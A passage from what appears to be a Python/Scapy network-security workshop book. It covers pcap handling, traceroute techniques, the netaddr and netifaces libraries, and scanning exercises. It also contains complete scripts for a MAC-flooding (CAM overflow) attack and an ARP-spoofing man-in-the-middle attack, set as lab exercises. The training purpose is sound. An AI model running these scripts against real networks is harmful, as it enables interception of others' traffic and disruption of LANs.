&lt;port_knock_seq.pcap: TCP:6 UDP:0 ICMP:0 Other:0&gt;
</code></pre>
<pre><code>&gt;&gt;&gt; pkts = sniff(offline=&quot;temp.cap&quot;)
</code></pre>
<h3 id="writing-pcap"><a class="header" href="#writing-pcap">Writing pcap</a></h3>
<p>You can write a set of packets into a PCAP file using wrpcap function.</p>
<pre><code>&gt;&gt;&gt; wrpcap(&quot;attack.pcap&quot;,packets)
</code></pre>
<h3 id="simple-tcp-replay-tool"><a class="header" href="#simple-tcp-replay-tool">Simple tcp-replay tool</a></h3>
<ul>
<li>You can write a very simple tcp-replay tools in one line of scapy
This piece of code send packets in a PCAP over the network, very handy in some forensic analysis situations</li>
</ul>
<pre><code>&gt;&gt;&gt; sendp(rdpcap(&quot;/tmp/pcapfile&quot;)) # tcpreplay
...........
Sent 11 packets.
</code></pre>
<h2 id="exercise-time---packet-hunting"><a class="header" href="#exercise-time---packet-hunting">Exercise time - packet hunting</a></h2>
<p>Please solve Exercise 5- packet hunting (Misc exercises)</p>
<p>Please solve Exercise 6 (Misc exercises)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="traceroute"><a class="header" href="#traceroute">Traceroute</a></h1>
<ul>
<li>Traceroute is a tool/technique to list all the routers that your packets go through to reach a target.</li>
<li>The technique is to send series of packets to the target with Time to Live (TTL) set in such a way that each router on the path will have to notify you of the death of the packet.</li>
<li>The traceroute technique is based on the way the IP protocol is designed. TTL value in IP header is seen as hop limit. Everytime a router recieves a packet to forward, it decrements the TTL by one and forwards the packet. When TTL reaches 0, the router will send a reply to the source machine indicating the packet has died.</li>
<li>The technique behind various tools is same but the way they implement it slightly differs. Unix systems use UDP datagrams while the Windows tracert program uses ICMP and tcptraceroute uses TCP.</li>
</ul>
<p>Most traceroute tools tend to send a packet with ceratin TTL value and wait for a reply before sending out the next packet which could slow down the whole process, especially when there is a network note that is unresponsive.</p>
<p>In this example, we are going to do a Standard ICMP Traceroute but we will send all our probes at the same time.</p>
<p>One obvious question, “Where do we stop?” For this exercises we’ll just send packets till TTL 30 and that is a decent number to reach almost any node on Internet.</p>
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;4.2.2.1&quot;,ttl=(1,10))/ICMP())
</code></pre>
<p>Once, we receive all probe requests we can obtain results:</p>
<pre><code>&gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;%IP.src%&quot;))
192.168.1.1
68.88.88.88
68.60.60.60
4.79.43.134
4.79.43.133
4.68.18.62
4.68.123.6
4.2.2.1
4.2.2.1
</code></pre>
<p>Similarly, we can use TCP SYN traceroute to obtain similar results:</p>
<pre><code>ans,unans=sr(IP(dst=&quot;4.2.2.1&quot;,ttl=(1,10))/TCP(dport=53,flags=&quot;S&quot;))
</code></pre>
<p>And again results would be:</p>
<pre><code>&gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}&quot;))
192.168.1.1     time-exceeded
68.86.90.162    time-exceeded
4.79.43.134     time-exceeded
4.79.43.133     time-exceeded
4.68.18.126     time-exceeded
4.68.123.38     time-exceeded
4.2.2.1         SA
</code></pre>
<p>Scapy includes a built-in traceroute() function to perform same functionality as above. Here is an example of TCP SYN traceroute:</p>
<pre><code>&gt;&gt;&gt; traceroute(&quot;4.2.2.1&quot;)
Begin emission:
***********************Finished to send 30 packets.
****
Received 27 packets, got 27 answers, remaining 3 packets
   4.2.2.1:tcp80      
1  192.168.1.1     11 
5  4.79.43.134     11 
6  4.79.43.133     11 
7  4.68.18.62      11 
8  4.68.123.6      11 
9  4.2.2.1         RA 
10 4.2.2.1         RA 
...
</code></pre>
<p>We can perform a DNS traceroute by specifying a complete packet in l4 parameter of traceroute() function:</p>
<pre><code>&gt;&gt;&gt; ans,unans=traceroute(&quot;4.2.2.1&quot;,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=&quot;thesprawl.org&quot;)))
Begin emission:
..*....******...******.***...****Finished to send 30 packets.
*****...***...............................
Received 75 packets, got 28 answers, remaining 2 packets
   4.2.2.1:udp53      
1  192.168.1.1     11 
4  68.86.90.162    11 
5  4.79.43.134     11 
6  4.79.43.133     11 
7  4.68.18.62      11 
8  4.68.123.6      11 
9  4.2.2.1            
...
</code></pre>
<p>Similarly, IP Fragment traceroute can be emulated with this command:</p>
<pre><code>&gt;&gt;&gt; res,unans = sr(IP(dst=&quot;4.2.2.1&quot;, ttl=(5,10), flags=&quot;MF&quot;)
...                /UDP(sport=RandShort( ), dport=53), timeout=125)
Note: I couldn't produce Type 11 Code 1 (Time Exceeded During Reassembly) ICMP error.
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-attacks"><a class="header" href="#network-attacks">Network Attacks</a></h1>
<ul>
<li><a href="attacks/cam_overflow.html">CAM Overflow Attack</a></li>
<li><a href="attacks/arp_spoofing.html">Host Discovery</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cam-overflow-mac-flooding-attack"><a class="header" href="#cam-overflow-mac-flooding-attack">CAM overflow/ MAC flooding attack</a></h1>
<p>The hands-on for this is while solving the &quot;Network Hunt&quot; challenge.</p>
<h2 id="background"><a class="header" href="#background">Background</a></h2>
<ul>
<li>Content Addressable Memory (CAM) Table Overflow is a Layer 2 attack on a switch</li>
<li>A switch’s CAM table contains network information such as MAC addresses available on physical switch ports and associated VLAN parameters.</li>
<li>MAC address flooding attack (CAM table flooding attack) is a type of network attack where an attacker connected to a switch port floods the switch interface with very large number of Ethernet frames with different fake source MAC address.</li>
<li>CAM Table Overflows occur when an influx of MAC addresses are flooded into the table and the CAM table threshold is reached. This causes the switch to act like a hub, flooding the network with traffic out all ports.</li>
</ul>
<p>More about CAM over flow: <a href="http://hakipedia.com/index.php/CAM_Table_Overflow">http://hakipedia.com/index.php/CAM_Table_Overflow</a></p>
<ul>
<li>MAC address flooding exploits the memory and hardware limitations in a switch’s CAM table.</li>
<li>Switchs are able to store numerous amounts of entries in the CAM table, however, once the resources are exhausted, the traffic is flooded out on all ports(or source VLAN), as the CAM table can no longer store MAC addresses, thus is no longer able to locate the MAC destination MAC address within a packet.</li>
<li>An attacker is able to exploit this limitation by flooding the switch with an influx of (mostly invalid) MAC addresses, until the CAM tables resources are depleted. - When the aforementioned transpires, the switch has no choice but to flood all ports with all incoming traffic. This is due to the fact that it cannot find the switch port number for a corresponding MAC address within the CAM table. By definition, the switch, acts like, and becomes a hub.</li>
</ul>
<h2 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h2>
<ul>
<li>CAM overflow attacks are very trivial and are very easy to lauch.</li>
<li>Tools like macof(part of dsniff suite) make it even easier to exploit.</li>
<li>To make the attacks reliable have an IP payload with random source and destination IP addresses.</li>
</ul>
<pre><code>#-------------------------------------------------------------------------------#
#     A script to perform CAM overflow attack on Layer 2 switches               #
#                   Bharath(github.com/0xbharath)                               #
#                                                                               #
#     CAM Table Overflow is flooding a switche's CAM table                      #
#     with a lot of fake entries to drive the switch into HUB mode.             #
#  (Send thousands of Ether packets with random MAC addresses in each packet)   #
#-------------------------------------------------------------------------------#

#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp


'''Filling packet_list with ten thousand random Ethernet packets
   CAM overflow attacks need to be super fast.
   For that reason it's better to create a packet list before hand.
'''

def generate_packets():
    packet_list = []        #initializing packet_list to hold all the packets
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list):
    sendp(packet_list, iface='tap0')

if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="arp-spoofingmitm"><a class="header" href="#arp-spoofingmitm">ARP Spoofing(MiTM)</a></h1>
<p>The hands-on for this is while solving the &quot;Network Hunt&quot; challenge.</p>
<blockquote>
<p><strong>Messing with ARP</strong></p>
<p>ARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)</p>
<p>Fortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left.</p>
</blockquote>
<p>In common hub networks all traffic can be seen by all hosts whose NICs (network interface card) are in promiscuous mode, but things are a bit different on switched networks.</p>
<p>A switch looks at the data sent to it and tries to only forward packets to its intended recipient based on the MAC address.</p>
<p>Switched networks are more secure and help speed up the network by only sending packets where they need to go.</p>
<p>There are ways around switches though. Using a program like Arpspoof (part of the Dsniff package), we can lie to other machines on the local area network and tell them we have the IP they are looking for, thus funneling their traffic through us.</p>
<p><img src="attacks/../imgs/mitm.png" alt="arp-spoofing" /></p>
<p>In the above image, the attacker is telling Alan’s box that he has the IP that corresponds to Brian’s box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN’s gateway an attacker can see all the traffic the computer is sending out and receiving.</p>
<h2 id="step-1---ip-forwarding"><a class="header" href="#step-1---ip-forwarding">Step 1 - IP forwarding</a></h2>
<p>Make sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.(“IP forwarding” is a synonym for “routing.” It is called “kernel IP forwarding” because it is a feature of the Linux kernel.)</p>
<pre><code>&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('echo 1 &gt; /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding
&gt;&gt;&gt; os.system('echo 0 &gt; /proc/sys/net/ipv4/ip_forward')           # disable kernel IP forwarding
</code></pre>
<p>More on kernel IP forwarding: <a href="http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding">http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding</a></p>
<h2 id="step-2---gather-mac-addresses"><a class="header" href="#step-2---gather-mac-addresses">Step 2 - Gather MAC addresses</a></h2>
<p>In order to create our ARP responses, we’ll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.</p>
<pre><code>def get_mac(IP):
    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r&quot;%Ether.src%&quot;)
</code></pre>
<h2 id="step-3---tricking-the-targets"><a class="header" href="#step-3---tricking-the-targets">Step 3 - Tricking the Targets</a></h2>
<p>In this step we are tricking eachmachine into thinking that the other party is our machine. ARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.</p>
<pre><code>def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
</code></pre>
<p>Step 4 - Un-doing the attack/ Re-ARPing</p>
<p>It’s not enough to trick the machines, once our attack is over, we need to re-assign the target’s addresses so they know where to send their information properly. If we don’t do this than it will be very obvious that something has happened.</p>
<pre><code>def reARP():
    print &quot;\n[*] Restoring Targets...&quot;
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
        disable_ip_forwarding()
    print &quot;[*] Shutting Down...&quot;
    sys.exit(1)
</code></pre>
<h2 id="final-script"><a class="header" href="#final-script">Final script</a></h2>
<pre><code>from scapy.all import *
import sys
import os
import time


def help_text():
    print(&quot;\nUsage:\n python hd_tcp_syn.py network_range\n&quot;)
    sys.exit()

def enable_ip_forwarding():
    print &quot;\n[*] Enabling IP Forwarding...\n&quot;
    os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)

def disable_ip_forwarding():
    print &quot;[*] Disabling IP Forwarding...&quot;
    os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r&quot;%Ether.src%&quot;)

def reARP():

    print &quot;\n[*] Restoring Targets...&quot;
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
    disable_ip_forwarding()
    print &quot;[*] Shutting Down...&quot;
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print &quot;[!] Couldn't Find Victim MAC Address&quot;
        print &quot;[!] Exiting...&quot;
    sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print &quot;[!] Couldn't Find Gateway MAC Address&quot;
    print &quot;[!] Exiting...&quot;
        sys.exit(1)
    print &quot;[*] Poisoning Targets...&quot;    
    while 1:
    try:
        trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
    except KeyboardInterrupt:
        reARP()
        break

if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        help_text()
    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3] 
    enable_ip_forwarding()
    mitm()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="libraries"><a class="header" href="#libraries">Libraries</a></h1>
<ul>
<li><a href="libraries/netaddr.html">netaddr</a></li>
<li><a href="libraries/netifaces.html">netifaces</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="netaddr"><a class="header" href="#netaddr">netaddr</a></h1>
<p>A Python library for representing and manipulating network addresses.</p>
<h2 id="features"><a class="header" href="#features">Features</a></h2>
<h3 id="layer-3-addresses"><a class="header" href="#layer-3-addresses">Layer 3 addresses</a></h3>
<ul>
<li>IPv4 and IPv6 addresses, subnets, masks, prefixes</li>
<li>Iterating, slicing, sorting, summarizing and classifying IP networks</li>
<li>Dealing with various ranges formats (CIDR, arbitrary ranges and globs, nmap)</li>
<li>Set based operations (unions, intersections etc) over IP addresses and subnets</li>
<li>Parsing a large variety of different formats and notations</li>
<li>Looking up IANA IP block information</li>
<li>Generating DNS reverse lookups</li>
<li>Supernetting and subnetting</li>
</ul>
<h3 id="layer-2-addresses"><a class="header" href="#layer-2-addresses">Layer 2 addresses</a></h3>
<ul>
<li>Representation and manipulation MAC addresses and EUI-64 identifiers</li>
<li>Looking up IEEE organisational information (OUI, IAB)</li>
<li>Generating derived IPv6 addresses</li>
</ul>
<h2 id="installation"><a class="header" href="#installation">Installation</a></h2>
<p>Install the latest netaddr from PIP</p>
<pre><code>pip install netaddr
</code></pre>
<p>Importing netaddr</p>
<pre><code>from netaddr import *
</code></pre>
<blockquote>
<p><strong>Importing modules</strong></p>
<p>Importing this way is not optimal and leads to name clashes.</p>
<p>In your own code, you should be explicit about the classes, functions and constants you import to avoid name clashes.</p>
</blockquote>
<h2 id="layer-3-addressingip"><a class="header" href="#layer-3-addressingip">Layer 3 addressing(IP)</a></h2>
<h3 id="ipaddress"><a class="header" href="#ipaddress">IPAddress</a></h3>
<p>IPAddress object represents a single IP address.</p>
<pre><code>&gt;&gt;&gt; from netaddr import IPAddress
&gt;&gt;&gt;
&gt;&gt;&gt; ip = IPAddress('192.21.8.11')
&gt;&gt;&gt; ip.version
4
&gt;&gt;&gt; dir(ip)
[ ... Snipped... 'bin', 'bits', 'format', 'info', 'ipv4', 'ipv6', 
'is_hostmask', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',
'is_loopback', 'is_multicast', 'is_netmask', 'is_private', 'is_reserved',
'is_unicast', 'key', 'netmask_bits', 'packed', 'reverse_dns', 'sort_key',
'value', 'version', 'words']
&gt;&gt;&gt; 
</code></pre>
<p>There are methods to handle coverting an IP adress into binary or bits, split an IP, pack an</p>
<pre><code>&gt;&gt;&gt; ip.bin
'0b11000000000101010000100000001011'
&gt;&gt;&gt; 
&gt;&gt;&gt; ip.bits()
'11000000.00010101.00001000.00001011'
&gt;&gt;&gt; 
&gt;&gt;&gt; ip.words
(192, 21, 8, 11)
&gt;&gt;&gt; ip.packed
'\xc0\x15\x08\x0b'
</code></pre>
<p>There are methods to check if the type of IP address(class, scope, type)</p>
<pre><code>&gt;&gt;&gt; ip.version
6
&gt;&gt;&gt; ip.is_unicast()
True
&gt;&gt;&gt; 
&gt;&gt;&gt; ip.is_link_local()
True
</code></pre>
<h3 id="ipnetwork"><a class="header" href="#ipnetwork">IPNetwork</a></h3>
<p>IPNetwork objects are used to represent subnets, networks or VLANs that accept CIDR prefixes and netmasks.</p>
<pre><code>&gt;&gt;&gt; from netaddr import IPNetwork
&gt;&gt;&gt; 
&gt;&gt;&gt; ip_range = IPNetwork('192.241.21.6/24')
&gt;&gt;&gt; 
&gt;&gt;&gt; dir(ip_range)
[ ... snipped ...  'broadcast', 'cidr', 'first', 'hostmask', 'info',
'ip', 'ipv4', 'ipv6', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',
'is_loopback', 'is_multicast', 'is_private', 'is_reserved', 'is_unicast',
'iter_hosts', 'key', 'last', 'netmask', 'network', 'next', 'prefixlen',
'previous', 'size', 'sort_key', 'subnet', 'supernet', 'value', 'version']
&gt;&gt;&gt;
</code></pre>
<p>There are a bunch of methods associated with IPNetwork to understand the network defined.</p>
<pre><code>&gt;&gt;&gt; ip_range.network
IPAddress('192.241.21.0')
&gt;&gt;&gt;
&gt;&gt;&gt; ip_range.hostmask
IPAddress('0.0.0.255')
&gt;&gt;&gt; 
&gt;&gt;&gt; ip_range.netmask
IPAddress('255.255.255.0')
&gt;&gt;&gt;
&gt;&gt;&gt; ip_range.broadcast
IPAddress('192.241.21.255')
&gt;&gt;&gt;
&gt;&gt;&gt; ip_range.size
256
</code></pre>
<p>You can use a simple for loop to iterate over the list of IP addresses in the network range defined.</p>
<pre><code>&gt;&gt;&gt; for i in ip_range:
...     print i
... 
192.241.21.0
192.241.21.1
... snipped ...
192.241.21.255
</code></pre>
<h4 id="list-operations-on-ipnetwork-object"><a class="header" href="#list-operations-on-ipnetwork-object">List operations on IPNetwork object</a></h4>
<p>If you treat an IPNetwork object as if it were a standard Python list object it will give you access to a list of individual IP address objects also various standard python list methods.</p>
<pre><code>&gt;&gt;&gt; ip_range = IPNetwork('192.0.2.16/29')
&gt;&gt;&gt; 
&gt;&gt;&gt; ip_range_list = list(ip_range)
&gt;&gt;&gt; 
&gt;&gt;&gt; len(ip_range_list)
8
&gt;&gt;&gt; ip_range_list
[IPAddress('192.0.2.16'), IPAddress('192.0.2.17'), ...snipped... IPAddress('192.0.2.23')]
&gt;&gt;&gt;
&gt;&gt;&gt; ip_range_list[6]        # indexing
IPAddress('192.0.2.22')
&gt;&gt;&gt;
&gt;&gt;&gt; ip_range_list[2:5

]      # slicing
[IPAddress('192.0.2.18'), IPAddress('192.0.2.19'), IPAddress('192.0.2.20')]
</code></pre>
<h3 id="iprange"><a class="header" href="#iprange">IPRange</a></h3>
<p>You can represent an arbitrary IP address range using a lower and upper bound address in the form of an IPRange object.</p>
<pre><code>&gt;&gt;&gt; ip_range = IPRange('192.168.1.0', '192.168.1.20')
&gt;&gt;&gt; 
&gt;&gt;&gt; for i in ip_range:
...     print i
... 
192.168.1.0
... snipped ...
192.168.1.19
192.168.1.20
</code></pre>
<h3 id="ip-sets"><a class="header" href="#ip-sets">IP sets</a></h3>
<p>You can specify either IP addresses and networks as strings. Alternatively, you can use IPAddress, IPNetwork, IPRange or other IPSet objects.</p>
<pre><code>&gt;&gt;&gt; IPSet(['192.0.2.0'])
IPSet(['192.0.2.0/32'])
&gt;&gt;&gt;
&gt;&gt;&gt; IPSet([IPAddress('192.0.2.0')])
IPSet(['192.0.2.0/32'])
&gt;&gt;&gt;
&gt;&gt;&gt; IPSet([IPNetwork('192.0.2.0/24')])
IPSet(['192.0.2.0/24'])
&gt;&gt;&gt;
&gt;&gt;&gt; IPSet(IPRange(&quot;10.0.0.0&quot;, &quot;10.0.1.31&quot;))
IPSet(['10.0.0.0/24', '10.0.1.0/27'])
</code></pre>
<p>You can interate over all the IP addresses that are members of the IP set.</p>
<pre><code>&gt;&gt;&gt; for ip in IPSet(['192.0.2.0/28']):
...     print ip
192.0.2.0
192.0.2.1
... snipped ...
192.168.2.15
</code></pre>
<p>Adding and removing set elements</p>
<pre><code>&gt;&gt;&gt; from netaddr import IPSet
&gt;&gt;&gt; 
&gt;&gt;&gt; s1 = IPSet()
&gt;&gt;&gt; 
&gt;&gt;&gt; s1.add('192.168.1.0/30')
&gt;&gt;&gt; s1.size
4
&gt;&gt;&gt; 
&gt;&gt;&gt; '192.168.1.3' in s1
True
&gt;&gt;&gt; 
&gt;&gt;&gt; s1.remove('192.168.1.3')
&gt;&gt;&gt; s1.size
3
</code></pre>
<p>You can do all sorts of set operations on IPSets</p>
<pre><code>&gt;&gt;&gt; scan1 = IPSet(['192.168.1.0/30'])
&gt;&gt;&gt; 
&gt;&gt;&gt; scan1
IPSet(['192.168.1.0/30'])
&gt;&gt;&gt; 
&gt;&gt;&gt; scan1.size
4
&gt;&gt;&gt; 
&gt;&gt;&gt; scan2 = IPSet(['192.168.1.0/31'])
&gt;&gt;&gt; 
&gt;&gt;&gt; scan2.size
2
&gt;&gt;&gt; 
&gt;&gt;&gt; scan1 | scan2
IPSet(['192.168.1.0/30'])
&gt;&gt;&gt; 
&gt;&gt;&gt; scan1 &amp; scan2
IPSet(['192.168.1.0/31'])
&gt;&gt;&gt;
&gt;&gt;&gt; scan1 ^ scan2
IPSet(['192.168.1.2/31'])
</code></pre>
<h3 id="layer-2-addressingmac"><a class="header" href="#layer-2-addressingmac">Layer 2 addressing(MAC)</a></h3>
<p>Instances of the EUI class are used to represent MAC addresses.</p>
<pre><code>&gt;&gt;&gt; mac = EUI('ec:f4:bb:87:2d:0c')
</code></pre>
<p>There are methods to print out common properties of an address</p>
<pre><code>&gt;&gt;&gt; dir(mac)
 ... snipped ... 'bin', 'bits', 'dialect', 'ei', 'eui64', 'iab',
'info', 'ipv6', 'ipv6_link_local', 'is_iab', 'modified_eui64', 'oui',
'packed', 'value', 'version', 'words']
&gt;&gt;&gt;
&gt;&gt;&gt; str(mac), str(mac.ei), str(mac.oui), str(mac.version)
('EC-F4-BB-87-2D-0C', '87-2D-0C', 'EC-F4-BB', '48')
</code></pre>
<p>There are methods to provide info on OUI and other organizational info.</p>
<pre><code>&gt;&gt;&gt; mac.info
{'OUI': {'address': ['one dell way',
             'MS:RR5-45',
             'Round rock Texas 78682',
             'UNITED STATES'],
 'idx': 15529147,
 'offset': 3429092,
 'org': 'Dell Inc',
 'oui': 'EC-F4-BB',
 'size': 141}}
&gt;&gt;&gt; 
</code></pre>
<pre><code>&gt;&gt;&gt; oui = mac.oui
&gt;&gt;&gt; 
&gt;&gt;&gt; dir(oui)
[ ... snipped ... 'records', 'reg_count', 'registration']
&gt;&gt;&gt; 
&gt;&gt;&gt; oui.registration().org
'Dell Inc'
&gt;&gt;&gt;
&gt;&gt;&gt; oui.registration().address
['one dell way', 'MS:RR5-45', 'Round rock Texas 78682', 'UNITED STATES']
</code></pre>
<h2 id="examples-of-netaddr-usage-in-open-source-projects"><a class="header" href="#examples-of-netaddr-usage-in-open-source-projects">Examples of netaddr usage in open source projects</a></h2>
<p>For more examples of various netaddr modules usage in open source projects: <a href="http://www.programcreek.com/python/index/2955/netaddr">http://www.programcreek.com/python/index/2955/netaddr</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="netifaces"><a class="header" href="#netifaces">netifaces</a></h1>
<ul>
<li>A portable third-party library in Python to enumerate network interfaces on local machine.</li>
<li>Historically it has been difficult to straightforwardly get the network address(es) of the machine on which your Python scripts are running without compromising the portability of your script.</li>
<li><code>netifaces</code> takes care of enumerating interfaces, network addresses and also preserves the portability(works on all *nix systems atleast).</li>
</ul>
<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
<p>netifaces needs python extension modules. In case you haven’t already, you should install python-dev package.</p>
<pre><code>$ sudo apt-get install python-dev
</code></pre>
<p>You can install netifaces using PIP.</p>
<pre><code>$ pip install netifaces
</code></pre>
<h2 id="basic-operations"><a class="header" href="#basic-operations">Basic operations</a></h2>
<p>You can take a look at all the modules that are part of netifaces</p>
<pre><code>&gt;&gt;&gt; import netifaces
&gt;&gt;&gt; 
&gt;&gt;&gt; dir(netifaces)
[ ... snipped ...
'address_families', 'gateways', 'ifaddresses', 'interfaces', 'version']
&gt;&gt;&gt; 
</code></pre>
<p>Getting a list of all the network interface identifiers on the machine.</p>
<pre><code>&gt;&gt;&gt; netifaces.interfaces()
['lo', 'eth0', 'wlan0', 'eth3', 'vboxnet0']
</code></pre>
<p>You can ask for the addresses of a particular interface</p>
<pre><code>&gt;&gt;&gt; import netifaces
&gt;&gt;&gt; from pprint import pprint
&gt;&gt;&gt;
&gt;&gt;&gt; pprint(netifaces.ifaddresses('eth3'))
{2: [{'addr': '192.168.1.100',
      'broadcast': '192.168.1.255',
      'netmask': '255.255.255.0'}],
 10: [{'addr': 'fe80::364b:50ff:feb7:ef1d%eth3',
       'netmask': 'ffff:ffff:ffff:ffff::/64'}],
 17: [{'addr': '34:4b:50:b7:ef:1d', 'broadcast': 'ff:ff:ff:ff:ff:ff'}]}
</code></pre>
<h2 id="pprint"><a class="header" href="#pprint">pprint</a></h2>
<ul>
<li>pprint contains a “pretty printer” for producing aesthetically pleasing representations of your data structures</li>
<li>The formatter produces representations of data structures that can be parsed correctly by the interpreter, and are also easy for a human to read</li>
</ul>
<p>You can also get list of all the gateways</p>
<pre><code>&gt;&gt;&gt; netifaces.gateways()
{'default': {2: ('192.168.1.1', 'eth3')}, 2: [('192.168.1.1', 'eth3', True)]}
</code></pre>
<p>Getting list of IPv4 addresses excluding loopback and virtualbox adapters</p>
<pre><code>&gt;&gt;&gt; for iface in netifaces.interfaces():
...     if iface == 'lo' or iface.startswith('vbox'):
...         continue
...     iface_details = netifaces.ifaddresses(iface)
...     if iface_details.has_key(netifaces.AF_INET):
...         print iface_details[netifaces.AF_INET]
... 
[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.100'}]
[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.101'}]
</code></pre>
<h2 id="examples-of-netifaces-usage-in-open-source-projects"><a class="header" href="#examples-of-netifaces-usage-in-open-source-projects">Examples of netifaces usage in open source projects</a></h2>
<p>For more examples of netifaces usage in open source projects: <a href="http://www.programcreek.com/python/example/81895/netifaces.interfaces">http://www.programcreek.com/python/example/81895/netifaces.interfaces</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exercises"><a class="header" href="#exercises">Exercises</a></h1>
<ul>
<li><a href="exercises/misc.html">Misc Exercises</a></li>
<li><a href="exercises/network_hunt.html">Network Hunt testing</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="misc-exercises"><a class="header" href="#misc-exercises">Misc Exercises</a></h1>
<h2 id="exercise-1"><a class="header" href="#exercise-1">Exercise 1</a></h2>
<h3 id="network-sweeping"><a class="header" href="#network-sweeping">Network sweeping</a></h3>
<ul>
<li>Write a script to perform network sweeping i.e. given a IP address range, find all the machines that are alive</li>
<li>Use any of the host discovery techniques that have been discussed but ARP tends to be neat and faster on local networks</li>
</ul>
<pre><code>$ sudo python hd_tcp_syn.py 192.168.56.99-110
 192.168.56.102 is alive
 192.168.56.103 is alive
 192.168.56.107 is alive
</code></pre>
<h2 id="exercise-2"><a class="header" href="#exercise-2">Exercise 2</a></h2>
<h3 id="port-scanning"><a class="header" href="#port-scanning">Port scanning</a></h3>
<ul>
<li>Write a script to perform port scanning i.e. given an IP address, find status of ports on the machine(atleast find any open ports under 1024)</li>
<li>Use any of the port scanning techniques that have been discussed</li>
</ul>
<pre><code>$ sudo python tcp_syn_scan.py 192.168.56.107
'ftp_data    RA'
'21          RA
'ssh         SA'
'telnet      RA'
'24          RA'
</code></pre>
<h2 id="exercise-3"><a class="header" href="#exercise-3">Exercise 3</a></h2>
<h3 id="ip-id-pattern-finder"><a class="header" href="#ip-id-pattern-finder">IP ID pattern finder</a></h3>
<ul>
<li>Write a script that takes a target IP and checks for patterns in the IP ID generation</li>
<li>Basic checks include: if the IP IDs generated are: all zeros, are all constant, are all randomized or if they are incremental.</li>
</ul>
<p>Example:</p>
<pre><code>$ sudo python ipidseq.py 192.168.56.101

Target =&gt; 192.168.56.101

[+] Sending packets to the target
[+] Analyzing the IPID pattern
[*] IPID generation pattern on scanme.nmap.org is randomized
</code></pre>
<h4 id="pythonscapy-tips"><a class="header" href="#pythonscapy-tips">Python/Scapy tips:</a></h4>
<ul>
<li>Use <code>sr1</code> for sending packet and recieving first response</li>
<li>Python has in-built function <code>all()</code> that comes handy when comparing elements in list. Looking at below examples, think about how you can use it to do other comparisions.</li>
</ul>
